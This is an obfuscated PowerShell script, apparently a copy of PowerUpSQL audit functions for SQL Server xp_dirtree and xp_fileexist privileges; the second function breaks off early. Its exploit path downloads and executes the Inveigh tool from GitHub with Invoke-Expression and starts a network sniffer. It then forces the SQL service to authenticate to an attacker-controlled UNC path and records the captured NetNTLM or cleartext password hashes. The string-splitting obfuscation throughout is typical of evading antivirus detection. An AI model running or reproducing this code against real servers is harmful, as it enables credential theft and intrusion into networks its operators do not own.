        HelpmEsSaGe = {"{28}{10}{17}{18}{20}{12}{3}{25}{19}{23}{14}{2}{15}{29}{24}{5}{8}{27}{0}{4}{11}{16}{22}{21}{9}{1}{30}{26}{6}{7}{13}"-f 'pa','il','uthent','rve','ss',' a','ure','d ','nd',' w','hat th','wor',' Se','from.',' will attempt to a','i','d ','e ','S','c','QL','ashes','h','e','to,','r servi','capt',' ','IP t','cate ','l be '})]
        [string]${aTT`A`cKer`Ip},

        [Parameter(MaNDatOrY = ${F`A`lse},
        hElPmESSaGE = {"{3}{1}{6}{5}{7}{0}{4}{2}{8}"-f 'for','e','aptured','Tim',' hash to be c','ond to ',' in sec','way ','.'})]
        [int]${tim`EOUT} = 5
    )

    Begin
    {
        
        ${T`Bl`daTA} = &("{3}{0}{1}{2}" -f 'w','-Ob','ject','Ne') -TypeName ("{1}{4}{0}{2}{3}" -f '.Data.Da','Sy','taT','able','stem')
        ${Nu`Ll} = ${tB`lD`ATa}."Co`L`UmnS".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{3}{1}" -f 'Compu','Name','te','r'))
        ${N`ULL} = ${tb`LD`ATa}."CO`LU`mNs".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f 'ce','I','nstan'))
        ${n`Ull} = ${Tbl`D`AtA}."col`U`mns".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{3}{1}"-f'Vulnera','y','bil','it'))
        ${n`Ull} = ${TBld`A`Ta}."C`oLU`Mns".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}{3}"-f'D','escript','i','on'))
        ${N`UlL} = ${TBL`d`ATa}."CoL`UMNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}{3}" -f 'emedia','R','tio','n'))
        ${nu`Ll} = ${TB`lDa`TA}."C`oLu`mnS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}"-f'S','everity'))
        ${nu`ll} = ${tBl`daTA}."c`O`LumnS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}{3}"-f'I','sVuln','erab','le'))
        ${Nu`lL} = ${tB`LdATa}."C`Ol`UmnS".("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{2}{0}"-f'able','sExploi','t','I'))
        ${n`Ull} = ${TBlD`ATa}."C`OluMnS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}"-f'loited','xp','E'))
        ${N`ULl} = ${T`B`lDaTA}."cOL`UM`NS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}" -f 'ploi','Ex','tCmd'))
        ${Nu`ll} = ${Tbl`d`AtA}."c`O`LuMns".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}"-f 'tails','De'))
        ${NU`Ll} = ${T`Bl`data}."COLU`M`NS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}{3}"-f 'Re','fe','r','ence'))
        ${n`UlL} = ${T`Bld`ATa}."CoLu`MnS".("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}"-f'or','Aut','h'))
    }

    Process
    {
        
        &("{2}{3}{0}{1}" -f 'bo','se','Wri','te-Ver') -Message ("$Instance "+': '+'STAR'+'T'+' '+'VU'+'L'+'N'+'ERABILITY '+'CH'+'E'+'CK: '+'Exc'+'essi'+'ve '+'P'+'ri'+'vile'+'ge '+'- '+'x'+'p_dir'+'tree')

        
        ${testC`onNEc`TIOn} = &("{2}{3}{4}{1}{0}"-f'onTest','ti','G','et-SQLCon','nec') -Instance ${I`NsTaNCe} -Username ${u`SER`N`AME} -Password ${p`AsS`WoRD} -Credential ${cRedent`I`AL} -SuppressVerbose | &("{2}{1}{0}{3}" -f'j','Ob','Where-','ect') -FilterScript {
            ${_}."sTAt`Us" -eq ("{0}{3}{2}{1}" -f 'A','e','bl','ccessi')
        }
        if(-not ${TeStCOnn`Ec`Ti`oN})
        {
            
            &("{3}{2}{0}{4}{1}"-f '-','rbose','e','Writ','Ve') -Message ("$Instance "+': '+'C'+'ONNE'+'CTION '+'FAILED'+'.')
            &("{3}{2}{0}{1}"-f 'e-Ve','rbose','t','Wri') -Message ("$Instance "+': '+'C'+'OM'+'PLETE'+'D '+'VULNE'+'R'+'AB'+'ILITY'+' '+'CHEC'+'K:'+' '+'E'+'xc'+'essive '+'Pr'+'iv'+'ilege '+'- '+'xp_d'+'irtre'+'e.')
            Return
        }
        else
        {
            &("{0}{2}{1}{3}"-f 'Wri','Ver','te-','bose') -Message ("$Instance "+': '+'CONNECT'+'I'+'ON'+' '+'SU'+'CCESS.')
        }

        
        
        ${S`ervErI`Nfo} = &("{2}{1}{0}{4}{3}" -f'SQ','-','Get','rInfo','LServe') -Instance ${in`S`TaNce} -Username ${USER`N`AmE} -Password ${pas`SW`ORd} -Credential ${C`R`edeNTiAl} -SuppressVerbose
        ${C`O`MP`UTErN`AmE} = ${sERveR`I`N`Fo}."CO`M`PUTERnA`Me"
        ${c`UR`RENTLO`giN} = ${S`eRVe`RINfo}."CUr`REn`TloG`In"
        ${CURreN`Tlo`GiNr`O`lES} = &("{3}{0}{4}{2}{1}"-f'QLSer','mber','leMe','Get-S','verRo') -Instance ${Ins`T`AnCe} -Username ${USE`Rn`AmE} -Password ${pAssw`ord} -Credential ${creD`eNTI`Al} -PrincipalName ${curre`NT`lO`GIn}  -SuppressVerbose
        ${cU`RRE`N`TP`RiNcpAlLI`St} = @()
        ${C`UrReNtp`Ri`N`cPAll`iSt} += ${cuRrENtL`oG`in}
        ${CUR`ReNtPr`i`NCpalliST} += ("{0}{2}{1}" -f'P','ic','ubl')
        ${cuR`R`ENtl`oGiNRo`lEs} | &("{2}{1}{0}" -f 'bject','O','ForEach-') -Process {
            ${CuRRenTPr`iNc`pa`lLisT} += ${_}."RolePRI`NCI`PALNa`mE"
        }

        
        
        
        if(${E`xPl`OIT})
        {
            ${TEStm`O`dE}  = ("{2}{1}{0}" -f't','oi','Expl')
        }
        else
        {
            ${T`eSt`MOde}  = ("{0}{1}" -f 'Audi','t')
        }
        ${v`ULNe`R`ABI`liTy} = ("{9}{5}{8}{0}{11}{4}{10}{3}{2}{7}{1}{6}"-f'P','ecute xp_dir','e','eg','vi','cess','tree',' - Ex','ive ','Ex','l','ri')
        ${de`Sc`R`IptiOn}   = ("{57}{110}{111}{121}{104}{127}{93}{136}{109}{125}{32}{66}{78}{105}{131}{116}{129}{4}{44}{141}{71}{7}{31}{58}{118}{100}{133}{112}{26}{97}{8}{85}{149}{18}{140}{74}{25}{27}{41}{33}{46}{15}{119}{120}{123}{113}{17}{122}{89}{55}{11}{47}{138}{48}{56}{70}{28}{61}{84}{72}{22}{62}{1}{53}{86}{5}{39}{38}{9}{50}{59}{147}{49}{117}{95}{142}{151}{73}{42}{65}{51}{99}{115}{132}{139}{83}{94}{80}{82}{21}{0}{134}{114}{54}{91}{137}{103}{29}{2}{64}{144}{16}{6}{126}{3}{135}{20}{37}{67}{35}{98}{68}{75}{60}{148}{19}{36}{88}{96}{90}{124}{77}{30}{108}{146}{145}{102}{81}{152}{76}{150}{63}{128}{10}{40}{24}{45}{107}{52}{79}{87}{43}{13}{23}{130}{143}{92}{34}{69}{101}{12}{14}{106}"-f'ems','a','p_dir',' used','x','.','an ','y members ','QL Server ','s','ec','accoun','fau','admin role','l','forc','c','rv','ee ','sa','late a lower p',' to syst','e',' in SQL','rver servi','e','defaul',' ',' ','x','c','of','red procedure ',' ','14, by ','e','dm','ri',' The ',' ','ause the SQL Se','used','ed +',' sys','ec','ce ','to ','t to ','entic','o','ervice a','ra','nt is a','ttack','s ','ervice ','ate ','xp',' ','c','o s','a rem',' ','sed.  Tha','tre',' c','th','vil','us','d','to','ed b','t',' be captur','n b','er t','ng ','a','a',' member of t','c','e','cess','o gain unauthorize','o','2000','er','he','in when a machi','r s','managed','als','000-20','ve ex','d a',' can ','ne or ','t in S','ged ','cked','c ','e','isnt b',' means ','s a n','t c','t.','accou','c','de','_dirtre','e ',' by ','e','Thi',' or rel','b','unt password hash','the Publi','e',' the SQL ','i','e','S',' ','d sto','be','ati','ts b','e e',' Ser','an ','ay','role','. ',' to esca','ten','o','auth','ed t','ca','ut','the','ver 2','e ',' ','ount','c','y','-2014. Xp_dirtr','u','n','i')
        ${rEm`Edia`T`iOn}   = ("{33}{38}{12}{6}{24}{1}{23}{29}{19}{11}{13}{2}{16}{18}{3}{37}{27}{5}{4}{31}{28}{8}{10}{17}{7}{20}{30}{15}{21}{26}{32}{22}{14}{0}{35}{25}{34}{36}{9}"-f 'E EXEC','n t','r',' n','nd','ogins a','v','a','e','ic','s. ','_DIRTREE proced','UTE pri','u','VOK','c','e ',' Ex','for','P','mp','omma',': RE','he ','ileges o',' xp_di','n','dministrative l','rol','X','le ',' ','d','Remove','rtree ','UTE ON','to Publ','on a',' EXEC')
        ${sEV`eri`Ty}      = ("{2}{1}{0}" -f 'dium','e','M')
        ${i`sVuL`Ne`RaBLe}  = 'No'
        ${ise`xPLo`Ita`BLE} = 'No'
        ${e`xPLOi`T`ed}     = 'No'
        ${E`xp`loiT`cmd}    = ("{7}{1}{3}{9}{0}{2}{10}{8}{11}{5}{6}{4}" -f ' hash ','rack ','offlin','th','m.','lay it to ','another syste','C','r r','e password','e o','e')
        ${d`EtA`Ils}       = ''
        ${rEfe`ReN`ce}     = ("{12}{14}{10}{2}{0}{6}{16}{7}{11}{1}{5}{9}{8}{13}{4}{3}{15}" -f 'ut','t','om/exec','etasploit','-m','tacks-','i','smb-rel','a-sq','vi','etspi.c','ay-a','https','l-server-using','://blog.n','/','ng-')
        ${AuT`H`or}        = (("{5}{4}{0}{6}{2}{1}{8}{9}{3}{7}"-f 'therl',', Net','ind)','201','ott Su','Sc','and (@_nullb','6','SPI',' '))

        
        
        
        

        
        ${di`RtReEpRI`Vs} = &("{3}{4}{5}{0}{2}{1}" -f'QLDat','asePriv','ab','G','et-','S') -Instance ${I`Nst`AnCE} -Username ${usErna`mE} -Password ${pAss`W`oRD} -Credential ${creD`EnT`I`Al} -DatabaseName ("{1}{2}{0}"-f'ter','m','as') -SuppressVerbose | &("{0}{3}{2}{1}" -f 'W','t','Objec','here-') -FilterScript {
            ${_}."obje`c`TNA`ME" -eq ("{1}{2}{0}" -f'tree','xp','_dir') -and ${_}."pE`RMi`s`siOn`NAme" -eq ("{1}{0}{2}" -f'XEC','E','UTE') -and ${_}."STatE`dESC`RiPTION" -eq ("{1}{0}" -f 't','gran')
        }

        
        if(${dI`RtRE`e`privs})
        {
            
            &("{2}{0}{1}"-f 'rite-Ver','bose','W') -Message ("$Instance "+': '+'- '+'A'+'t '+'lea'+'st '+'o'+'ne '+'princi'+'pal'+' '+'has'+' '+'EXE'+'CUT'+'E '+'priv'+'ile'+'ges '+'on'+' '+'xp_dir'+'tr'+'ee.')

            ${iSvuL`Ner`ABLE}  = 'Yes'

            if(${ex`P`LOiT}){
                
                
                ${cuRrENtI`DE`N`Tity} =   (gET-VaRIaBLE UtNjP  -valuEonlY)::("{2}{0}{1}" -f 'tC','urrent','Ge').Invoke()
                ${p`Rp} = &("{3}{1}{2}{0}"-f 'ect','w-Ob','j','Ne') -TypeName ("{0}{4}{5}{2}{1}{6}{7}{3}"-f 'S','indows','Principal.W','l','ys','tem.Security.','Princi','pa') -ArgumentList (${CUr`R`enT`idEn`TItY})
                ${A`dm} =   $MGI::"ADmi`NistR`A`Tor"
                ${IS`A`dMIN} = ${P`RP}.("{0}{2}{1}" -f'IsI','Role','n').Invoke(${a`dm})
            
                if(-not ${iSA`dmIN})
                {
                    &("{0}{1}{2}{3}"-f 'Writ','e-Ve','rb','ose') -Message ("$Instance "+': '+'- '+'You'+' '+'do'+' '+'n'+'ot '+'ha'+'ve '+'Admi'+'nis'+'trat'+'or '+'righ'+'ts.'+' '+'R'+'un '+'th'+'is '+'fu'+'nction '+'as'+' '+'an'+' '+'A'+'dm'+'inist'+'rator '+'i'+'n '+'o'+'rder '+'to'+' '+'l'+'oad '+'Inv'+'eigh'+'.')
                    ${Ia`MADM`In} = 'No'
                }else{
                    &("{2}{0}{1}"-f'rite-Ve','rbose','W') -Message ("$Instance "+': '+'- '+'Yo'+'u '+'hav'+'e '+'Adm'+'ini'+'stra'+'to'+'r '+'r'+'igh'+'ts. '+'Inve'+'igh '+'wi'+'ll '+'be'+' '+'lo'+'ade'+'d.')
                    ${iA`mad`MiN} = 'Yes'
                }
            }
            
            ${DI`RT`R`EepRIvS} |
            &("{3}{0}{1}{2}" -f 'or','Each-O','bject','F') -Process {
                ${PRI`NCIPA`L`N`AME} = ${dI`RTREeP`RIVs}."pR`Inc`I`pALna`Me"

                
                ${Cur`ReN`TpRI`NcP`ALl`ISt} |
                &("{4}{0}{1}{2}{3}"-f 'rEa','ch-','O','bject','Fo') -Process {
                    ${PrInC`I`PAlCHeCk} = ${_}

                    if(${p`R`iN`CIpAlNAME} -eq ${pri`NCIP`AlcHe`Ck} -or ${PRINCIP`ALn`A`mE} -eq ("{0}{1}" -f'publ','ic'))
                    {
                        ${I`seXPL`oI`TaBLe}  = 'Yes'                      

                        
                        if((${Ia`MADM`In} -eq 'Yes') -and (${E`xplO`IT}))
                        {
                            
                            
                            

                            
                            if(-not ${a`Ttac`kErIP})
                            {
                                ${ATta`ck`ERIp} = (&("{3}{2}{0}{1}" -f'tio','n','nec','Test-Con') -ComputerName ("{1}{0}{2}"-f '0.0.','127.','1') -Count 1 |
                                    &("{1}{0}{2}"-f 'e','S','lect-Object') -ExpandProperty ("{0}{1}{2}{3}"-f 'Ipv','4Ad','d','ress') |
                                &("{1}{0}{2}" -f 'je','Select-Ob','ct') -Property ("{2}{1}{3}{0}" -f'ring','PAd','I','dressToSt') -ExpandProperty ("{0}{1}{2}{3}{4}" -f'IPAd','dre','ssT','oSt','ring'))

                                if(${Att`AC`Ker`Ip} -eq ("{1}{0}{2}"-f '0','127.0.','.1'))
                                {
                                    ${aT`TACK`ER`IP} = &("{1}{0}{2}"-f'-WmiO','Get','bject') -Class ("{0}{6}{4}{7}{2}{5}{1}{3}"-f'w','atio','terconfi','n','da','gur','in32_networka','p') -Filter ((("{4}{0}{3}{5}{2}{1}" -f'ble','Truehek','k','d = ','ipena','he'))."r`EpLACe"(([CHaR]104+[CHaR]101+[CHaR]107),[sTrInG][CHaR]39)) -ComputerName ${eN`V:c`OM`puTeRN`AmE} |
                                    &("{2}{0}{1}"-f 'ec','t-Object','Sel') -First 1 -Property @{
                                        ("{1}{0}" -f'e','Nam')       = ("{0}{1}" -f'IPAd','dress')
                                        ("{2}{1}{0}" -f 'ion','press','Ex') = {
                                            [regex]${Rx} = '(\d{1,3}(\.?)){4}'; ${Rx}.("{2}{1}{0}" -f 'es','h','matc').Invoke(${_}."iP`AdDrESs")[0]."v`AlUE"
                                        }
                                    } |
                                    &("{2}{0}{1}{3}"-f't-Obj','e','Selec','ct') -Property ("{0}{1}{2}"-f 'IPa','ddr','ess') -ExpandProperty ("{1}{0}{2}"-f 'es','IPAddr','s') -First 1
                                }
                            }

                            
                            &("{0}{4}{5}{2}{3}{1}"-f 'In','n','es','sio','voke-Exp','r') -Command (&("{1}{0}{2}" -f 'ew-O','N','bject') -TypeName ("{3}{2}{4}{0}{1}{5}" -f'l','ie','m.net.we','syste','bc','nt')).("{0}{1}{2}" -f'do','wnloads','tring').Invoke(("{6}{5}{9}{11}{12}{8}{14}{13}{2}{4}{10}{1}{3}{0}{7}" -f'te','n/Inve','evin','igh/mas','-R','ps://ra','htt','r/Inveigh.ps1','ercon','w.','obertso','git','hubus','nt.com/K','te'))

                            ${Tes`T`IT} = &("{0}{2}{1}"-f 'Te','Path','st-') -Path (("{1}{2}{3}{0}" -f 'gh','Funct','ion:kOmInvo','ke-Invei'))."rePLA`cE"('kOm',[sTRinG][cHAR]92)
                            if(${test`IT} -eq ("{1}{0}" -f 'ue','Tr'))
                            {
                                &("{2}{1}{0}"-f 'bose','rite-Ver','W') -Message ("$Instance "+': '+'- '+'Inv'+'e'+'igh '+'lo'+'aded.')

                                
                                ${I`NSta`N`CeIp} =   $qvnJ6::("{3}{2}{0}{1}" -f'Ad','dresses','ost','GetH').Invoke(${Co`mpuTEr`N`Ame})

                                
                                &("{3}{0}{2}{1}" -f 'rite-','bose','Ver','W') -Message ("$Instance "+': '+'- '+'Start'+' '+'sniffi'+'n'+'g...')
                                ${N`ULl} = &("{1}{4}{3}{0}{2}" -f 've','I','igh','e-In','nvok') -HTTP ('N') -NBNS ('Y') -MachineAccounts ('Y') -WarningAction ("{3}{0}{1}{2}"-f 'entlyC','o','ntinue','Sil') -IP ${att`AcKer`Ip}

                                
                                ${P`AtH} = (-join ((65..90) + (97..122) | &("{1}{2}{0}{3}" -f 'o','Get-Ran','d','m') -Count 5 | &('%') {[char]${_}}))

                                
                                &("{0}{1}{3}{2}"-f 'Writ','e','Verbose','-') -Message ("$Instance "+': '+'- '+'In'+'ject '+'UN'+'C '+'pat'+'h '+'t'+'o '+"\\$AttackerIp\$path...")
                                ${nU`ll} = &("{0}{2}{1}" -f 'Ge','ery','t-SQLQu') -Instance ${in`sTA`NcE} -Username ${US`ErNaME} -Password ${P`ASs`WOrd} -Credential ${CrE`DE`N`Tial} -Query ('xp_dirtre'+'e'+' '+"'\\$AttackerIp\$path'") -TimeOut 10 -SuppressVerbose

								
								&("{1}{2}{4}{3}{0}" -f'se','Wr','ite-','o','Verb') -Message ("$Instance "+': '+'- '+'Sle'+'epi'+'ng '+'fo'+'r '+"$TimeOut "+'s'+'ec'+'onds '+'to'+' '+'ensu'+'re'+' '+'th'+'e '+'ha'+'sh '+'c'+'o'+'mes '+'b'+'ack')
                                &("{3}{0}{2}{1}" -f 't','eep','-Sl','Star') -s ${timEO`UT}
                                
                                
                                ${nu`Ll} = &("{2}{0}{1}" -f'g','h','Stop-Invei')
                                &("{1}{2}{0}" -f 'se','Write-Ve','rbo') -Message ("$Instance "+': '+'- '+'Stopp'+'ed '+'snif'+'fing'+'.')

                                ${hAS`hty`pE} = ''
                                ${H`ASh} = ''

                                [string]${PA`sSC`LEarT`eXT} = &("{2}{0}{3}{1}" -f 't-I','igh','Ge','nve') -Cleartext
                                if(${P`ASs`c`learTEXt})
                                {
                                    ${HAsh`T`Ype} = ("{0}{1}"-f'Cleart','ext')
                                    ${h`AsH} = ${P`A`Ss`CLeARteXT}
                                }

                                [string]${pAss`Net`Nt`lMv1} = &("{3}{0}{2}{1}"-f 'nvei','h','g','Get-I') -NTLMv1
                                if(${PA`ssNE`T`NtL`mv1})
                                {
                                    ${hAsH`T`Ype} = ("{0}{2}{1}" -f 'Net','TLMv1','N')
                                    ${ha`sh} = ${PaS`s`NEtN`T`Lmv1}
                                }

                                [string]${p`A`s`snETNtL`MV2} = &("{3}{1}{2}{0}" -f'igh','e','t-Inve','G') -NTLMv2
                                if(${PA`S`sN`ETntLMV2})
                                {
                                    ${Ha`Sh`Ty`PE} = ("{1}{0}"-f'LMv2','NetNT')
                                    ${ha`Sh} = ${pa`SsNetn`TlMv2}
                                }

                                if(${H`ASh})
                                {
                                    
                                    &("{4}{3}{1}{2}{0}"-f'e','-Verb','os','rite','W') -Message ("$Instance "+': '+'- '+'Re'+'covered'+' '+"$HashType "+'ha'+'sh:')
                                    &("{2}{3}{1}{0}{4}"-f 'te-Verbos','i','W','r','e') -Message ("$Instance "+': '+'- '+"$Hash")
                                    ${EXPL`o`ited} = 'Yes'

                                    ${D`et`AilS} = ('Th'+'e '+"$PrincipalName "+'pr'+'inc'+'i'+'pal '+'h'+'as '+'EXEC'+'U'+'TE '+'priv'+'il'+'eges '+'o'+'n '+'th'+'e '+'x'+'p_d'+'i'+'rtree '+'pro'+'c'+'e'+'dure '+'i'+'n '+'t'+'he '+'m'+'aster '+'datab'+'ase'+'. '+'R'+'ecov'+'ered '+'pass'+'wo'+'rd '+'ha'+'sh! '+'H'+'ash '+'t'+'ype '+'= '+"$HashType;Hash "+'= '+"$Hash")
                                }
                                else
                                {
                                    
                                    ${eXP`Loi`TeD} = 'No'
                                    ${det`AI`Ls} = ('T'+'he '+"$PrincipalName "+'pri'+'nci'+'pal '+'h'+'as '+'EXEC'+'UT'+'E '+'pr'+'ivil'+'ege'+'s '+'o'+'n '+'the'+' '+'xp_d'+'irt'+'ree '+'p'+'roce'+'du'+'re '+'i'+'n '+'the'+' '+'maste'+'r '+'datab'+'as'+'e. '+' '+'xp_'+'di'+'r'+'tree '+'E'+'xecu'+'ted'+', '+'b'+'ut '+'no'+' '+'pa'+'ss'+'word '+'hash'+' '+'wa'+'s '+'r'+'ec'+'overed.')
                                }

                                
                                ${nU`ll} = &("{0}{2}{1}{3}{4}" -f 'Clea','ve','r-In','i','gh')
                            }
                            else
                            {
                                &("{1}{0}{2}" -f'bos','Write-Ver','e') -Message ("$Instance "+': '+'- '+'Inveigh'+' '+'coul'+'d '+'not'+' '+'be'+' '+'l'+'oaded.')
                                
                                ${ex`pLoIT`ed} = 'No'
                                ${D`etAi`Ls} = ('T'+'he '+"$PrincipalName "+'princip'+'a'+'l '+'ha'+'s '+'EXE'+'CUT'+'E '+'p'+'rivile'+'ges '+'on'+' '+'the'+' '+'x'+'p'+'_dirtree'+' '+'p'+'ro'+'cedure '+'i'+'n '+'th'+'e '+'maste'+'r '+'da'+'t'+'ab'+'ase, '+'bu'+'t '+'Inve'+'ig'+'h '+'c'+'ould '+'n'+'ot '+'b'+'e '+'l'+'oaded '+'so'+' '+'no'+' '+'password'+' '+'hash'+'e'+'s '+'c'+'ou'+'ld '+'be'+' '+'rec'+'overed'+'.')
                            }
                        }
                        else
                        {
                            
                            ${E`xp`LOited} = 'No'
                            ${D`Eta`IlS} = ('T'+'he '+"$PrincipalName "+'prin'+'cipa'+'l '+'ha'+'s '+'EXE'+'CUTE '+'p'+'r'+'ivileg'+'es '+'on'+' '+'t'+'he '+'xp_dir'+'tr'+'ee'+' '+'proced'+'u'+'re'+' '+'in'+' '+'th'+'e '+'maste'+'r'+' '+'d'+'ata'+'ba'+'se.')
                        }
                    }
                    else
                    {
                        
                        ${isexp`l`oIt`AB`LE}  = 'No'
                        ${DEtA`i`lS} = ('T'+'he '+"$PrincipalName "+'prin'+'cipal'+' '+'h'+'as '+'E'+'X'+'ECUTE '+'privi'+'leges'+' '+'the'+' '+'xp_d'+'irt'+'ree'+' '+'p'+'rocedure'+' '+'i'+'n '+'the'+' '+'mas'+'ter'+' '+'d'+'atab'+'ase.')
                    }
                }

                
                ${nu`Ll} = ${TbLD`A`TA}."r`owS".("{0}{1}" -f 'Ad','d').Invoke(${c`oMPuTeRna`me}, ${I`NSTAn`cE}, ${V`UL`NEraBILI`Ty}, ${D`ESCRiP`Ti`on}, ${Re`MEdIaT`IoN}, ${s`E`VER`Ity}, ${I`SVULn`Er`A`BLe}, ${i`seXp`loitA`B`LE}, ${EXp`L`oI`TEd}, ${ex`pl`OITCMD}, ${De`TAILs}, ${RE`FeR`E`NCE}, ${A`UTHoR})
            }
        }
        else
        {
            &("{0}{1}{2}{3}"-f'Write','-V','erbos','e') -Message ("$Instance "+': '+'- '+'N'+'o '+'lo'+'gin'+'s '+'w'+'ere '+'f'+'ound '+'wi'+'th '+'t'+'he '+'E'+'X'+'ECUTE '+'pr'+'ivile'+'ge '+'on'+' '+'xp_di'+'r'+'t'+'ree.')
        }

        
        &("{1}{0}{2}{4}{3}" -f 'i','Wr','te','se','-Verbo') -Message ("$Instance "+': '+'COMPLETE'+'D'+' '+'VU'+'LNERA'+'B'+'ILITY '+'CH'+'ECK'+': '+'E'+'xc'+'es'+'sive '+'Priv'+'ileg'+'e '+'- '+'XP'+'_DI'+'RTREE')
    }

    End
    {
        
        if ( -not ${n`O`OuTPut})
        {
            Return ${T`BLd`Ata}
        }
    }
}






Function iN`V`oK`e-sq`LAudItpRI`VxpFI`lEE`xisT
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNDAtORy = ${Fa`lSE},
                vALuEfRomPiPELineByprOPerTyNAME = ${T`RUE},
        hElpmeSsaGE = {"{8}{0}{2}{4}{3}{7}{6}{5}{1}"-f 'Serve','th.','r or domain acc','unt to','o','ate wi','c',' authenti','SQL '})]
        [string]${uSe`Rn`AME},

        [Parameter(maNdatORY = ${F`AlSE},
                vaLUefroMPIPelineBYpropErtYNaME = ${Tr`Ue},
        HeLpMEssaGe = {"{8}{4}{7}{6}{9}{0}{1}{3}{5}{2}" -f' to ','authen','ate with.','ti','ver or ','c','account passwo','domain ','SQL Ser','rd'})]
        [string]${P`As`sWOrd},

        [Parameter(mAnDatOrY = ${Fa`lse},
                vALUEfrOMPiPEliNeBypROPErTYnaMe = ${tr`Ue},
        heLpMeSsAGe = {"{1}{5}{3}{2}{0}{4}" -f'i','Window','nt','e','als.','s cred'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`R`eDen`TiAl} =   ( Get-item ('VArIa'+'b'+'LE:045'+'9M2')  ).VALUE::"Emp`TY",

        [Parameter(maNdATOry = ${F`AlsE},
                vALUEfrompipElINeBYpropErtYName = ${tR`Ue},
        HeLPmessAgE = {"{1}{5}{3}{4}{2}{6}{0}"-f'ion to.','SQL ','e to con','r ins','tanc','Serve','nect'})]
        [string]${in`S`Tan`Ce},

        [Parameter(MAndatOry = ${FA`lse},
        HeLPmessAGE = {(("{2}{5}{0}{4}{1}{3}"-f't o','t anything','Do','.','utpu','n1se'))-rEplaCe  '1se',[Char]39})]
        [string]${NO`out`put},

        [Parameter(MAnDAtory = ${F`Alse},
        HelpMEssAGE = {"{2}{5}{6}{1}{0}{7}{8}{3}{4}" -f 'ln','u','E','ssu','es.','xploit ','v','e','rable i'})]
        [switch]${EXpLO`It},

        [Parameter(mAndaTOrY = ${F`ALSe},
        HelpMESsAGE = {"{15}{13}{12}{7}{17}{19}{16}{4}{10}{3}{20}{6}{18}{8}{0}{14}{2}{9}{1}{5}{11}"-f 'a','tured fr',' w','hentic','tempt to a','o','e to, and pass','erver','ord h','ill be cap','ut','m.','e SQL S',' th','shes','IP that',' at',' service w','w','ill','at'})]
        [string]${a`TTa`CkE`RIp},

        [Parameter(mANdAtOrY = ${fA`l`se},
        HelPmEsSage = {"{5}{13}{0}{3}{6}{9}{1}{8}{11}{10}{4}{2}{12}{7}" -f'i','way','r','n ','e captu','Ti','sec','.',' for ','ond to ',' to b','hash','ed','me '})]
        [int]${TI`me`out} = 5
    )

    Begin
    {
        
        ${TBLD`A`TA} = &("{2}{1}{0}" -f'bject','-O','New') -TypeName ("{3}{1}{4}{2}{0}" -f'ataTable','em.','a.D','Syst','Dat')
        ${nu`lL} = ${T`BL`daTa}."CoL`U`mns".("{1}{0}" -f 'd','Ad').Invoke(("{3}{2}{0}{1}"-f'a','me','mputerN','Co'))
        ${nU`ll} = ${Tb`Ld`ATa}."c`OLuM`NS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}"-f'tance','Ins'))
        ${n`ULl} = ${Tb`ldA`Ta}."Col`UmnS".("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}" -f 'V','bility','ulnera'))
        ${N`Ull} = ${t`Bl`DATa}."COLU`M`Ns".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}{3}" -f'D','scri','e','ption'))
        ${Nu`Ll} = ${tb`lDa`Ta}."c`Olu`MNS".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}"-f'Reme','on','ti','dia'))
        ${N`ULl} = ${tBl`Da`TA}."c`oLUM`NS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}" -f 'Sever','ity'))
        ${nU`lL} = ${tBLd`A`TA}."c`OLum`NS".("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{1}{2}" -f'IsVu','nera','ble','l'))
        ${NU`ll} = ${tB`LDa`TA}."C`olu`MnS".("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{1}{2}" -f'Is','l','oitable','Exp'))
        ${nU`Ll} = ${TBld`A`Ta}."c`oLUMnS".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}" -f 'ited','Expl','o'))
        ${Nu`lL} = ${t`BlDA`Ta}."co`l`UMNs".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}" -f'Ex','pl','oitCmd'))
        ${nU`Ll} = ${Tb`ldAta}."CO`lUmNS".("{0}{1}"-f'A','dd').Invoke(("{0}{1}{2}" -f'D','et','ails'))
        ${N`Ull} = ${tBLD`AtA}."Co`luMNs".("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f'ference','Re'))
        ${n`ULl} = ${T`Bl`dAta}."co`L`UMNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}"-f 'thor','Au'))
    }

    Process
    {
        
        &("{1}{3}{2}{0}"-f 'e','Wr','e-Verbos','it') -Message ("$Instance "+': '+'STAR'+'T '+'VULN'+'ERABILI'+'TY'+' '+'CH'+'E'+'CK: '+'Exces'+'si'+'ve '+'Pri'+'vile'+'ge '+'- '+'x'+'p_filee'+'xi'+'st')

        
        ${T`EsTCoNnecTi`oN} = &("{2}{3}{1}{5}{4}{0}" -f'onTest','LC','G','et-SQ','nnecti','o') -Instance ${IN`stan`cE} -Username ${USer`N`AME} -Password ${P`A`sS`WorD} -Credential ${CredEN`TI`AL} -SuppressVerbose | &("{2}{0}{1}" -f 'e','ct','Where-Obj') -FilterScript {
            ${_}."st`A`TUs" -eq ("{3}{2}{0}{1}"-f 'ibl','e','ss','Acce')
        }
        if(-not ${tEsT`CO`Nn`Ection})
        {
            
            &("{0}{4}{2}{1}{3}" -f 'Wr','erb','te-V','ose','i') -Message ("$Instance "+': '+'CON'+'NE'+'CTION'+' '+'FA'+'ILED'+'.')
